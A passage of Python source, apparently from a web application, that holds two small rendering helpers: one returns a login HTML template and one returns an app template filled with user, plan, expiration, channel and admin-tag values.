    return _login_html(channel, admin_tag, error)

def render_app(user='', plano='', expiracao='', channel='', admin_tag=''):
    return _app_html(user, plano, expiracao, channel, admin_tag)
